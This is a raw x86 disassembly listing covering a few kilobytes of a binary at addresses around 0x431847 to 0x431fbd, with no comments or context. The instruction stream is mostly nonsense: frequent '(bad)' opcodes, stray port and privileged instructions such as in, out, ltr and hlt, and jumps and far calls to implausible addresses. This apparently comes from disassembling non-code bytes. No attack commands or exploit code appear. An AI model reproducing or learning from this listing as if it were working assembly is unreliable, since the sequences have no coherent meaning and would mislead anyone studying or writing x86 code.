  431847:	cmp    eax,DWORD PTR [eax]
  431849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43184a:	mov    eax,DWORD PTR [eax]
  43184c:	cld    
  43184d:	jae    0x4317cf
  43184f:	add    eax,DWORD PTR [ecx]
  431851:	clc    
  431852:	add    BYTE PTR [eax+0x30],dl
  431855:	mov    DWORD PTR [ecx],esi
  431857:	clc    
  431858:	pop    ds
  431859:	inc    ebp
  43185a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431860:	(bad)  
  431861:	push   DWORD PTR [edi]
  431863:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431869:	(bad)  
  43186a:	jae    0x43186b
  43186c:	mov    eax,DWORD PTR [ebp-0x740175]
  431872:	sub    eax,DWORD PTR [eax]
  431874:	add    eax,DWORD PTR [eax]
  431876:	mov    DWORD PTR [ecx+0x5f],eax
  431879:	mov    DWORD PTR [ebx-0x4],ebx
  43187c:	ret    0xff
  43187f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431885:	ret    
  431886:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43188c:	add    BYTE PTR [ebp-0x7d],al
  43188f:	mov    DWORD PTR [eax],eax
  431891:	add    al,0x84
  431893:	inc    DWORD PTR [ecx]
  431895:	lea    eax,[eax]
  431897:	hlt    
  431898:	sar    bh,cl
  43189a:	test   BYTE PTR [eax+0x1],dl
  43189d:	inc    ebp
  43189e:	add    BYTE PTR [ebx],dh
  4318a0:	test   BYTE PTR [ebx],0x84
  4318a3:	push   eax
  4318a4:	add    BYTE PTR [ebp+0x0],al
  4318a7:	add    eax,0x86
  4318ac:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4318b2:	add    BYTE PTR [ecx],al
  4318b4:	add    BYTE PTR [eax],al
  4318b6:	mov    esi,0x550030
  4318bb:	mov    ecx,DWORD PTR [edi]
  4318bd:	cld    
  4318be:	fidiv  DWORD PTR [ebp+0x0]
  4318c1:	mov    edi,DWORD PTR [ecx]
  4318c3:	xor    BYTE PTR [eax+eax*1],0x84
  4318c7:	add    eax,DWORD PTR [eax]
  4318c9:	sbb    BYTE PTR [eax],al
  4318cb:	jne    0x43187e
  4318cd:	mov    eax,DWORD PTR [ecx]
  4318cf:	sbb    BYTE PTR [eax],al
  4318d1:	mov    DWORD PTR [ebp-0x1],esp
  4318d4:	add    BYTE PTR [eax+0x30e45ca],bh
  4318da:	ret    0xb7fc
  4318dd:	dec    ebp
  4318de:	or     al,0x89
  4318e0:	dec    ebp
  4318e1:	cld    
  4318e2:	cmovne ecx,DWORD PTR [eax-0x75]
  4318e6:	add    edi,esp
  4318e8:	seto   BYTE PTR [esi-0x72ffffff]
  4318ef:	inc    ebp
  4318f0:	adc    al,0x8b
  4318f2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318f9:	cmp    DWORD PTR [edi+0x72],edx
  4318fc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431902:	gs cmp al,0x0
  431905:	je     0x4318dd
  431907:	push   eax
  431908:	sar    BYTE PTR [eax],1
  43190a:	mov    bh,0x3e
  43190c:	push   cs
  43190d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431913:	add    DWORD PTR [ecx+0x12],ebp
  431916:	dec    edx
  431917:	(bad)  
  431918:	mov    eax,edx
  43191a:	in     al,dx
  43191b:	adc    DWORD PTR [ecx],esi
  43191d:	pop    esi
  43191e:	inc    ecx
  43191f:	leave  
  431920:	or     DWORD PTR [eax],ebx
  431922:	gs push ebp
  431924:	add    ah,ch
  431926:	into   
  431927:	in     al,dx
  431928:	enter  0xb756,0xf0
  43192c:	push   cs
  43192d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431937:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43193d:	jnp    0x74439e45
  431943:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431949:	add    BYTE PTR [edi],cl
  43194b:	mov    edi,DWORD PTR [ecx-0x78]
  43194e:	ltr    WORD PTR [ecx-0x7b]
  431952:	dec    DWORD PTR [edi]
  431954:	clc    
  431955:	out    0x45,eax
  431957:	add    BYTE PTR [eax],cl
  431959:	cmp    ebx,0xffffff8c
  43195c:	jge    0x43195e
  43195e:	jb     0x431970
  431960:	je     0x5219e0
  431966:	pop    edx
  431967:	push   esi
  431968:	mov    ecx,DWORD PTR [edi]
  43196a:	in     al,dx
  43196b:	rol    DWORD PTR [ebp+0x0],1
  43196e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431975:	cmp    DWORD PTR [ecx],0xfffffff0
  431978:	hlt    
  431979:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43197f:	(bad)  
  431981:	push   eax
  431982:	jns    0xb842fe00
  431988:	lock push cs
  43198a:	ror    edx,0x3
  43198d:	test   BYTE PTR [ecx+0x5500e800],cl
  431993:	dec    eax
  431994:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431998:	(bad)  
  431999:	mov    esi,0x7f33ff5f
  43199e:	inc    eax
  43199f:	test   DWORD PTR [edx],eax
  4319a1:	je     0x431963
  4319a3:	mov    ecx,ecx
  4319a5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4319a9:	and    eax,DWORD PTR [eax+0xf0103]
  4319af:	jp     0x43199d
  4319b1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4319b5:	add    edx,DWORD PTR [edi+0x74]
  4319b8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4319be:	add    BYTE PTR [ebp-0x74c48bbb],al
  4319c4:	je     0x431949
  4319c6:	cmp    eax,edi
  4319c8:	js     0x4319ed
  4319ca:	add    eax,0xeb0fc003
  4319cf:	jns    0x43195c
  4319d1:	vmread DWORD PTR [ecx+0x45],ebx
  4319d5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4319db:	adc    al,0x8b
  4319dd:	jge    0x4319f3
  4319df:	mov    edi,DWORD PTR [eax-0x4]
  4319e2:	add    edi,DWORD PTR [edi]
  4319e4:	or     bh,bh
  4319e6:	push   ebp
  4319e7:	push   es
  4319e8:	mov    DWORD PTR [ebp-0x4],ebx
  4319eb:	add    edi,esi
  4319ed:	pop    es
  4319ee:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319f4:	mov    DWORD PTR [esp+esi*8],ecx
  4319f7:	inc    ebp
  4319f8:	pop    ebp
  4319f9:	xor    DWORD PTR [esi-0x4],0x3b
  4319fd:	add    edx,DWORD PTR [ecx+edi*1]
  431a00:	push   es
  431a01:	clc    
  431a02:	mov    bh,0xdb
  431a04:	jp     0x4319bd
  431a06:	add    cl,BYTE PTR [esi]
  431a08:	div    DWORD PTR [edi+0x4d8b0c1c]
  431a0e:	test   edi,edi
  431a10:	je     0x431a06
  431a12:	mov    eax,ecx
  431a14:	or     BYTE PTR [ebx],al
  431a16:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431a1c:	jbe    0x431a90
  431a1e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431a24:	add    ecx,DWORD PTR [esi]
  431a26:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431a2c:	add    eax,DWORD PTR [ebx-0x287af783]
  431a32:	je     0x431a81
  431a34:	mov    DWORD PTR [ecx],edi
  431a36:	mov    esi,eax
  431a38:	hlt    
  431a39:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a40:	jb     0x431a02
  431a42:	jmp    0x431a2f
  431a44:	xor    esi,DWORD PTR [ebx]
  431a46:	pop    edi
  431a47:	pop    esi
  431a48:	pop    ebx
  431a49:	ret    
  431a4a:	ret    0x8b
  431a4d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a53:	xor    DWORD PTR ds:0x89339c0c,0x56
  431a5a:	cld    
  431a5b:	cmp    DWORD PTR [ebp+0xf],eax
  431a5e:	xor    al,0x85
  431a60:	pushf  
  431a61:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  431a67:	ret    
  431a68:	mov    edi,DWORD PTR [esi-0x4]
  431a6b:	pop    eax
  431a6c:	dec    ebp
  431a6d:	jne    0x4319fa
  431a6f:	xor    edi,esp
  431a71:	inc    eax
  431a72:	dec    ebp
  431a73:	jbe    0x431ac8
  431a75:	inc    eax
  431a76:	pop    ebp
  431a77:	add    edx,DWORD PTR [esi+0x8]
  431a7a:	push   ebx
  431a7b:	dec    eax
  431a7c:	push   ecx
  431a7d:	mov    eax,edi
  431a7f:	and    al,0xf0
  431a81:	jo     0x431a6e
  431a83:	mov    eax,DWORD PTR [ebx]
  431a85:	sbb    BYTE PTR [ebp+0x4d],cl
  431a88:	mov    eax,DWORD PTR [ebx]
  431a8a:	nop
  431a8b:	or     BYTE PTR [eax],al
  431a8d:	jne    0x431ae6
  431a8f:	cmp    ebx,DWORD PTR [edx+0x33893277]
  431a95:	cld    
  431a96:	xor    edi,edi
  431a98:	add    edi,DWORD PTR [ebp+0x3]
  431a9b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431aa1:	js     0x431a27
  431aa3:	jae    0x431aa7
  431aa5:	(bad)  
  431aa7:	xor    al,0x5d
  431aa9:	jmp    0x431a36
  431aab:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431ab2:	fdecstp 
  431ab4:	test   BYTE PTR [edi],ah
  431ab6:	add    bh,BYTE PTR [ebp+0x0]
  431ab9:	add    ebx,DWORD PTR [ebp-0x77]
  431abc:	mov    edi,eax
  431abe:	cmp    al,0x0
  431ac1:	adc    dh,BYTE PTR [ebx]
  431ac3:	jge    0x431ac8
  431ac5:	mov    edi,DWORD PTR [ebx]
  431ac7:	jl     0x431ad8
  431ac9:	clc    
  431aca:	dec    edi
  431acb:	jge    0x431acd
  431acd:	mov    eax,DWORD PTR [ebx]
  431acf:	jb     0x431ad9
  431ad1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ad4:	mov    edi,edi
  431ad6:	xor    edx,DWORD PTR [eax]
  431ad8:	add    edi,DWORD PTR [ebx]
  431ada:	mov    DWORD PTR [ebp-0x10],edi
  431add:	inc    edi
  431ade:	pop    ebp
  431adf:	jge    0x431b1c
  431ae1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ae5:	mov    edx,0xc05d87f0
  431aea:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aee:	fimul  WORD PTR [eax]
  431af0:	fist   WORD PTR [ebp+0x1c]
  431af3:	in     al,dx
  431af4:	jne    0x431ae2
  431af6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431afc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431b00:	fdivp  st(0),st
  431b02:	fild   WORD PTR [ebp+0x4510f85c]
  431b08:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431b0e:	inc    ebp
  431b0f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431b15:	mov    ebp,DWORD PTR [ebx-0x4]
  431b18:	adc    al,0x8b
  431b1a:	rcl    DWORD PTR [eax],0x48
  431b1d:	mov    esi,0x7080803
  431b22:	fiadd  WORD PTR [ebp+0x4d]
  431b25:	(bad)  
  431b26:	mov    edx,DWORD PTR [edx-0x4]
  431b29:	mov    edx,DWORD PTR [ebp-0x4]
  431b2c:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b32:	mov    DWORD PTR [edi+0x872dc],edi
  431b38:	xlat   BYTE PTR ds:[ebx]
  431b39:	into   
  431b3a:	ffreep st(6)
  431b3c:	retf   0x6c7
  431b3f:	iret   
  431b40:	dec    ebp
  431b41:	inc    ebp
  431b42:	mov    DWORD PTR [ebx],edi
  431b44:	fmul   QWORD PTR [edi]
  431b46:	dec    ebp
  431b47:	jnp    0x431b7c
  431b49:	add    BYTE PTR [ebx],al
  431b4b:	mov    ecx,DWORD PTR [esp+edi*8]
  431b4e:	inc    ebp
  431b4f:	dec    ebp
  431b50:	lea    esi,[ebx]
  431b52:	add    DWORD PTR [ebx],eax
  431b54:	jb     0x431b91
  431b56:	add    BYTE PTR [edi],cl
  431b58:	inc    ebp
  431b59:	imul   eax,edi,0x858bd800
  431b5f:	cld    
  431b60:	clc    
  431b61:	mov    DWORD PTR [ebp+0x0],eax
  431b64:	inc    DWORD PTR [eax]
  431b66:	or     al,0xde
  431b68:	sbb    bh,0x1
  431b6b:	retf   
  431b6c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b73:	dec    ebp
  431b74:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b7a:	enter  0x12de,0xdf
  431b7e:	inc    ebp
  431b7f:	pop    ebp
  431b80:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b86:	add    DWORD PTR [edx],edx
  431b88:	add    BYTE PTR [ebp+0x50],dl
  431b8b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b91:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  431b98:	loopne 0x431bb1
  431b9a:	cdq    
  431b9b:	push   ebp
  431b9c:	clc    
  431b9d:	mov    eax,DWORD PTR [ebp-0x4]
  431ba0:	xor    edx,edx
  431ba2:	add    esi,DWORD PTR [ebx]
  431ba4:	cmp    eax,DWORD PTR [ebx]
  431ba6:	hlt    
  431ba7:	cmp    DWORD PTR [ebx],esp
  431ba9:	or     al,BYTE PTR [ebp+0xf]
  431bac:	mov    eax,DWORD PTR [edx]
  431bae:	loopne 0x431bb0
  431bb0:	(bad)  
  431bb1:	mov    ecx,esi
  431bb3:	cld    
  431bb4:	pushf  
  431bb5:	pop    ebp
  431bb6:	call   0x10c0:0x8bf0328b
  431bbd:	add    eax,DWORD PTR [eax+0x10018b]
  431bc3:	dec    ebp
  431bc4:	iret   
  431bc5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431bcb:	dec    ebp
  431bcc:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431bd2:	(bad)  
  431bd3:	iret   
  431bd4:	inc    ebp
  431bd5:	(bad)  
  431bd6:	jne    0x431c25
  431bd8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431bde:	(bad)  
  431bdf:	cmp    ebx,eax
  431be1:	je     0x431b69
  431be3:	add    edi,edi
  431be5:	or     bh,bh
  431be7:	dec    ebp
  431be8:	inc    ebp
  431be9:	mov    esi,DWORD PTR [ebx]
  431beb:	cld    
  431bec:	add    ecx,esi
  431bee:	cmp    ecx,DWORD PTR [eax-0xc]
  431bf1:	mov    edx,DWORD PTR [edi]
  431bf3:	or     BYTE PTR [ebp-0x7c],al
  431bf6:	mov    ebx,DWORD PTR [edx-0x7639cd18]
  431bfc:	test   BYTE PTR [edx+ebx*4],cl
  431bff:	inc    ebp
  431c00:	xor    bh,BYTE PTR [eax]
  431c02:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431c09:	jne    0x431bd2
  431c0b:	mov    ebp,esp
  431c0d:	fcomp  DWORD PTR [ebx]
  431c0f:	add    BYTE PTR [ecx],al
  431c11:	inc    DWORD PTR [ebp-0x75]
  431c14:	(bad)  
  431c15:	cld    
  431c16:	add    al,0xce
  431c18:	mov    ecx,edi
  431c1a:	cld    
  431c1b:	inc    ebp
  431c1c:	fidivr WORD PTR [ebx]
  431c1e:	fbstp  TBYTE PTR [ebp-0x3e]
  431c21:	mov    eax,DWORD PTR [eax]
  431c23:	adc    BYTE PTR [ebx-0x3974038b],cl
  431c29:	fadd   st,st(7)
  431c2b:	add    BYTE PTR [ebp-0x1],al
  431c2e:	mov    ecx,DWORD PTR [esp+edi*8]
  431c31:	inc    ebp
  431c32:	mov    bh,0xc7
  431c35:	loopne 0x431c7c
  431c37:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c3d:	sbb    al,0x33
  431c3f:	pushf  
  431c40:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c46:	mov    eax,edi
  431c48:	cwde   
  431c49:	inc    ebp
  431c4a:	inc    ebp
  431c4b:	jne    0x431bd8
  431c4d:	mov    esp,esp
  431c4f:	clc    
  431c50:	add    al,0x4d
  431c52:	mov    DWORD PTR [ebx],esi
  431c54:	or     al,0x33
  431c56:	inc    ebp
  431c57:	lea    ecx,[ebx-0x398d13fd]
  431c5d:	add    bh,al
  431c5f:	inc    ebp
  431c60:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c67:	add    ebp,esp
  431c69:	shufps xmm1,xmm3,0xc7
  431c6d:	(bad)  
  431c6e:	jmp    0x74885797
  431c73:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c79:	hlt    
  431c7a:	mov    ecx,DWORD PTR [edi]
  431c7c:	fadd   DWORD PTR [ebp+0x0]
  431c7f:	xor    ecx,DWORD PTR [edi]
  431c81:	add    ecx,ecx
  431c83:	cmp    edi,edi
  431c85:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c89:	(bad)  
  431c8a:	jmp    0x431c17
  431c8c:	mov    edi,esp
  431c8e:	or     al,0xc6
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	mov    eax,DWORD PTR [ebp+0x10]
  431c95:	jne    0x431c20
  431c97:	mov    eax,DWORD PTR [ecx]
  431c99:	clc    
  431c9a:	add    BYTE PTR [ebp-0x40],cl
  431c9d:	xor    edx,DWORD PTR [eax-0x73]
  431ca0:	jne    0x431ca3
  431ca2:	push   DWORD PTR [edx+0x8]
  431ca5:	add    BYTE PTR [ebp+0x45],al
  431ca8:	mov    ebp,ecx
  431caa:	cld    
  431cab:	add    BYTE PTR [ebp+0x0],cl
  431cae:	xor    eax,DWORD PTR [ebp+0x3]
  431cb1:	lea    edi,[ebx]
  431cb3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431cb9:	sub    eax,0x5d330e4d
  431cbe:	lea    esi,[ebx]
  431cc0:	add    DWORD PTR [ebx],eax
  431cc2:	jb     0x431cad
  431cc4:	add    BYTE PTR [eax],al
  431cc6:	inc    ebp
  431cc7:	add    bl,ch
  431cc9:	inc    ebp
  431cca:	mov    esi,DWORD PTR [ebx]
  431ccc:	or     al,0x3
  431cce:	(bad)  
  431ccf:	mov    edi,eax
  431cd1:	in     al,dx
  431cd2:	scas   eax,DWORD PTR es:[edi]
  431cd3:	inc    ebp
  431cd4:	mov    esi,DWORD PTR [ebx]
  431cd6:	in     al,0x3
  431cd8:	add    al,0x89
  431cda:	mov    ecx,DWORD PTR [eax+edi*8]
  431cdd:	dec    ebp
  431cde:	(bad)  
  431cdf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3166]
  431ce6:	mov    ecx,eax
  431ce8:	cld    
  431ce9:	push   es
  431cea:	dec    ebp
  431ceb:	add    al,0x33
  431ced:	mov    DWORD PTR [ebx],eax
  431cef:	in     al,dx
  431cf0:	cmp    DWORD PTR [ebp-0x67],eax
  431cf3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cf9:	mov    edx,DWORD PTR [ebp-0x4]
  431cfc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cff:	xor    eax,DWORD PTR [ebp+0x3]
  431d02:	cmp    DWORD PTR [ebx],0x8b327499
  431d08:	xor    edi,esp
  431d0a:	jmp    0xff771a5c
  431d0f:	add    ecx,DWORD PTR [ebp-0x3f]
  431d12:	xor    ebx,DWORD PTR [edi]
  431d14:	add    eax,ecx
  431d16:	cmp    ebx,DWORD PTR [eax]
  431d18:	mov    ecx,DWORD PTR [ebp-0x4]
  431d1b:	mov    ecx,DWORD PTR [eax]
  431d1d:	adc    BYTE PTR [ebp-0x80],al
  431d20:	jmp    0x431d23
  431d22:	mov    eax,DWORD PTR [eax]
  431d24:	cld    
  431d25:	mov    bh,0xc6
  431d27:	push   ecx
  431d28:	(bad)  
  431d29:	jne    0x431d89
  431d2b:	dec    ecx
  431d2d:	or     BYTE PTR [ecx+ebx*1],cl
  431d30:	push   ebp
  431d31:	inc    ebp
  431d32:	in     al,dx
  431d33:	add    ebp,esp
  431d35:	or     bh,al
  431d37:	dec    ebp
  431d38:	cld    
  431d39:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d3f:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  431d43:	dec    DWORD PTR [ebx+0x45510cf4]
  431d49:	mov    DWORD PTR [ebx+0x5345fc0c],ecx
  431d4f:	mov    edx,DWORD PTR [ecx+0xc]
  431d52:	xor    eax,esi
  431d54:	mov    edx,0xc172c7
  431d59:	inc    ebp
  431d5a:	mov    esi,DWORD PTR [ebp+0x8]
  431d5d:	mov    eax,edx
  431d5f:	call   0x84c7e454
  431d64:	add    DWORD PTR [edx-0x76bace00],ebx
  431d6a:	mov    ebp,eax
  431d6c:	or     BYTE PTR [eax],dl
  431d6e:	jo     0x431dbd
  431d70:	push   edi
  431d71:	xor    esi,DWORD PTR [ebp+0x3]
  431d74:	(bad)  
  431d75:	pmulhuw mm0,mm1
  431d78:	test   DWORD PTR [ebp-0x8],ecx
  431d7b:	mov    DWORD PTR [ebp-0x67],eax
  431d7e:	mov    eax,DWORD PTR [ebp-0x4]
  431d81:	xor    edi,DWORD PTR [ebp-0x73]
  431d84:	xor    eax,DWORD PTR [ebx]
  431d86:	xor    esi,DWORD PTR [edx+0x3]
  431d89:	add    BYTE PTR [ecx],bh
  431d8b:	inc    ebp
  431d8c:	(bad)  
  431d8d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d93:	mov    DWORD PTR [eax],0x750f0004
  431d99:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d9f:	lock add BYTE PTR [ebp+0x0],cl
  431da3:	mov    esi,DWORD PTR [ebp-0x18]
  431da6:	mov    ebp,edx
  431da8:	or     al,0x72
  431daa:	ja     0x431dac
  431dac:	mov    edx,esi
  431dae:	cld    
  431daf:	(bad)  
  431db2:	cli    
  431db3:	mov    esi,DWORD PTR [ebp-0x4]
  431db6:	cmp    ecx,esi
  431db8:	bswap  edi
  431dba:	(bad)
  431dbe:	mov    esi,DWORD PTR [ebp-0x4]
  431dc1:	mov    esi,ecx
  431dc3:	clc    
  431dc4:	repnz add esi,DWORD PTR [ebp+0x45]
  431dc8:	push   ebx
  431dc9:	xor    eax,DWORD PTR [ebp+0x3]
  431dcc:	cmp    bl,BYTE PTR [edi-0x64]
  431dcf:	pop    ebx
  431dd0:	jmp    0x431e97
  431dd5:	mov    esi,DWORD PTR [ebp-0x7d]
  431dd8:	xor    ebp,DWORD PTR [eax]
  431dda:	lea    eax,[ebp-0x8]
  431ddd:	xor    eax,0xc7ef9cf2
  431de2:	neg    eax
  431de4:	ins    DWORD PTR es:[edi],dx
  431de5:	test   esi,edi
  431de7:	clc    
  431de8:	pop    esp
  431de9:	inc    ebp
  431dea:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431df0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431df6:	add    cl,al
  431df8:	jne    0x431d94
  431dfa:	mov    esi,DWORD PTR [edx]
  431dfc:	in     al,dx
  431dfd:	push   esi
  431dfe:	xor    BYTE PTR [ebp-0xe],dh
  431e01:	add    edi,esi
  431e03:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431e09:	add    cl,bh
  431e0b:	mov    edi,DWORD PTR [ebp+0x8]
  431e0e:	mov    DWORD PTR [ebp-0x14],esi
  431e11:	add    esi,DWORD PTR [ebp+0x3c]
  431e14:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431e1a:	mov    ah,0x38
  431e1c:	call   0xe0e4:0x898b329c
  431e23:	jne    0x431e9a
  431e25:	mov    ecx,DWORD PTR [ebx-0xe0e13f4]
  431e2b:	shl    edx,0xf2
  431e2e:	(bad)  
  431e2f:	mov    ah,0x16
  431e31:	dec    eax
  431e32:	jne    0x431dc7
  431e34:	mov    ecx,DWORD PTR [edi]
  431e36:	in     al,dx
  431e37:	jmp    0x431e2a
  431e39:	add    dl,dh
  431e3b:	mov    edi,esi
  431e3d:	or     al,0x8
  431e3f:	inc    ebp
  431e40:	jne    0x431e45
  431e42:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e48:	ret    
  431e49:	or     bh,bh
  431e4b:	jge    0x431e35
  431e4d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e53:	xor    edi,eax
  431e55:	add    esi,DWORD PTR [ebp-0x77]
  431e58:	mov    ebx,esp
  431e5a:	clc    
  431e5b:	neg    DWORD PTR [ebp-0x7c]
  431e5e:	xor    eax,DWORD PTR [eax]
  431e60:	cmp    eax,DWORD PTR [eax]
  431e62:	repz jne 0x431dfa
  431e65:	xor    eax,DWORD PTR [ecx]
  431e67:	add    ebx,DWORD PTR [eax]
  431e69:	mov    DWORD PTR [ebp-0x8],eax
  431e6c:	mov    eax,edi
  431e6e:	cld    
  431e6f:	lock pop eax
  431e71:	test   DWORD PTR [ebx],esi
  431e73:	clc    
  431e74:	add    edx,DWORD PTR [edi-0x740bff77]
  431e7a:	fdivp  st(4),st
  431e7c:	test   ecx,esi
  431e7e:	(bad)  
  431e7f:	jnp    0x431e80
  431e81:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e87:	jae    0x431e14
  431e89:	sub    edi,esp
  431e8b:	(bad)  
  431e8c:	shl    DWORD PTR [eax-0x3e],0x89
  431e90:	leave  
  431e91:	call   0x8198d59e
  431e96:	in     al,dx
  431e97:	(bad)  
  431e98:	in     al,dx
  431e99:	add    bh,al
  431e9b:	mov    esp,edi
  431e9d:	in     al,dx
  431e9e:	test   DWORD PTR [ebp-0x8],edi
  431ea1:	mov    eax,DWORD PTR [ebp+0x2b]
  431ea4:	xor    al,0x3
  431ea6:	pushf  
  431ea7:	jnp    0x57321ae0
  431ead:	xor    edx,DWORD PTR [ebx-0x77]
  431eb0:	push   ecx
  431eb1:	loopne 0x431ee6
  431eb3:	jne    0x431e70
  431eb5:	mov    esi,DWORD PTR [edx-0x20]
  431eb8:	add    BYTE PTR [ebp-0x3d],bh
  431ebb:	xor    eax,DWORD PTR [ebp-0x73]
  431ebe:	mov    edi,DWORD PTR [esi]
  431ec0:	cld    
  431ec1:	jb     0x431e89
  431ec3:	add    bl,al
  431ec5:	jne    0x431f0c
  431ec7:	mov    edx,DWORD PTR [edi-0x10]
  431eca:	jge    0x431f49
  431ecc:	mov    esi,DWORD PTR [ebx]
  431ece:	lock add ecx,DWORD PTR [ebp+0x3b]
  431ed2:	xor    esi,DWORD PTR [ebp-0x77]
  431ed5:	mov    esi,eax
  431ed7:	lock inc ebp
  431ed9:	jge    0x431f10
  431edb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431ee2:	dec    ebp
  431ee3:	mov    esi,DWORD PTR [ebx]
  431ee5:	loopne 0x431e70
  431ee7:	jge    0x431ee1
  431ee9:	add    DWORD PTR [ebp-0x7d],eax
  431eec:	cmc    
  431eed:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431ef4:	dec    ebp
  431ef5:	hlt    
  431ef6:	xor    ebx,DWORD PTR [ebp-0x77]
  431ef9:	mov    esi,esp
  431efb:	in     al,0x45
  431efd:	jge    0x431f38
  431eff:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431f06:	dec    ebp
  431f07:	dec    esp
  431f08:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431f0e:	inc    ebp
  431f0f:	hlt    
  431f10:	xor    eax,0xb88b9f75
  431f15:	add    al,0x95
  431f17:	icebp  
  431f18:	add    dl,dh
  431f1a:	mov    DWORD PTR [ebp+0x20],ebx
  431f1d:	cmp    eax,DWORD PTR [ebp+0xf]
  431f20:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431f24:	fistp  WORD PTR [ebx+0x0]
  431f27:	inc    ebp
  431f28:	mov    ebx,DWORD PTR [edi+0xc]
  431f2b:	add    eax,eax
  431f2d:	inc    ebp
  431f2e:	test   BYTE PTR [ebx],dh
  431f30:	add    eax,DWORD PTR [ebx]
  431f32:	add    BYTE PTR [esi+0x45],bl
  431f35:	ret    0x85
  431f38:	jnp    0x5443a307
  431f3e:	inc    bp
  431f40:	inc    ebp
  431f41:	xor    eax,0xc78a9cb9
  431f46:	add    ah,bl
  431f48:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  431f4e:	add    BYTE PTR [ebx+0x3],dl
  431f51:	mov    esi,0x708088b
  431f56:	cmp    esi,eax
  431f58:	setp   BYTE PTR [ecx-0x74fcffce]
  431f5f:	mov    esp,edi
  431f61:	call   0x33ce64b3
  431f66:	or     BYTE PTR [ebx],al
  431f68:	inc    ecx
  431f69:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f6f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f75:	lock add cl,al
  431f78:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f7f:	mov    ch,0x45
  431f81:	clc    
  431f82:	xor    eax,DWORD PTR [ebp+0x3]
  431f85:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f8b:	inc    ebp
  431f8c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f92:	mov    edi,eax
  431f94:	mov    eax,DWORD PTR [ebp+0x3c]
  431f97:	mov    ecx,DWORD PTR [eax]
  431f99:	hlt    
  431f9a:	inc    ebp
  431f9b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431fa2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431fa8:	push   ebp
  431fa9:	mov    edi,DWORD PTR [ebx]
  431fab:	in     al,dx
  431fac:	jne    0x431f6f
  431fae:	mov    eax,DWORD PTR [ebp-0x28]
  431fb1:	add    DWORD PTR [eax],0xe8058dec
  431fb7:	clc    
  431fb8:	mov    esi,DWORD PTR [edi-0x8]
  431fbb:	add    dh,dl
  431fbd:	rol    WORD PTR [ebp-0x1],cl
